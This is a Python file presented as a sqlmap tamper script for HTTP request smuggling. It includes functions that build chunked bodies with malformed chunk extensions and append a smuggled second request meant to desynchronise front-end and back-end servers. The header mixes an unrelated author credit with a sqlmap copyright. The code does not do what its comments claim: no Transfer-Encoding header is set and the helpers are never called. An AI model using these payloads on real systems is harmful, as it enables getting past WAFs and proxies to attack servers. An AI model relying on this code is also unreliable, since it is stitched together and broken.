#!/usr/bin/env python

# Author: CyberVaca , Luis Vacas de Santos
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import random
import string

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Adds malformed chunk extensions to exploit HTTP desync between front-end and back-end

    Requirement:
        * HTTP/1.1 chunked transfer encoding
        * Use with --chunked flag

    Tested against:
        * Proxies with inconsistent chunk extension parsing
        * WAFs that don't strictly validate RFC 9112 Section 7.1.1
        * Load balancers with lax HTTP parsing

    Notes:
        * Exploits differences in how front-end proxies and back-end servers
          parse chunk extensions (the part after semicolon in chunk size line)
        * A bare semicolon without extension name violates RFC but many parsers accept it
        * This can cause the front-end to see one request while back-end sees two
        * Best combined with --chunked flag for full effect

    Reference:
        * https://www.imperva.com/blog/smuggling-requests-with-chunked-extensions-a-new-http-desync-trick/
        * RFC 9112 Section 7.1.1 - Chunked Transfer Coding

    >>> tamper('SELECT * FROM users')
    'SELECT * FROM users'
    """

    # This tamper primarily works by modifying headers
    # The payload itself is returned unchanged, but we set up
    # the chunked extension manipulation via headers
    
    headers = kwargs.get("headers", {})
    
    # Add Transfer-Encoding header to signal chunked mode
    # The actual chunk manipulation happens in the request layer
    # This tamper sets a marker that can be detected by custom request handling
    headers["X-Chunk-Extension-Mode"] = "smuggle"
    
    # Generate a random extension name that looks valid but may confuse parsers
    ext_chars = string.ascii_lowercase
    random_ext = ''.join(random.choice(ext_chars) for _ in range(random.randint(3, 8)))
    headers["X-Chunk-Extension-Name"] = random_ext
    
    return payload


def create_smuggled_chunks(data):
    """
    Helper function to create chunked data with malformed extensions
    for HTTP request smuggling.
    
    This can be used by custom request handlers to generate
    the actual smuggled request format.
    
    Args:
        data: The payload data to encode in chunks
        
    Returns:
        Chunked encoded data with malformed extensions
    """
    
    result = []
    chunk_size = len(data)
    
    # Malformed chunk with bare semicolon (no extension name)
    # This violates RFC 9112 but many parsers accept it
    result.append("%x;\r\n" % chunk_size)
    result.append("%s\r\n" % data)
    
    # Zero chunk to end
    result.append("0\r\n")
    result.append("\r\n")
    
    return "".join(result)


def create_desync_payload(legitimate_data, smuggled_request):
    """
    Creates a payload that exploits chunk extension parsing differences
    to smuggle a secondary HTTP request.
    
    Args:
        legitimate_data: The data that front-end will see
        smuggled_request: The HTTP request to smuggle to back-end
        
    Returns:
        Combined payload for HTTP desync attack
    """
    
    result = []
    
    # First chunk with legitimate data and malformed extension
    chunk_size = len(legitimate_data)
    result.append("%x;malformed\r\n" % chunk_size)
    result.append("%s\r\n" % legitimate_data)
    
    # Zero chunk
    result.append("0\r\n")
    result.append("\r\n")
    
    # Smuggled request (back-end may interpret this as new request)
    result.append(smuggled_request)
    
    return "".join(result)
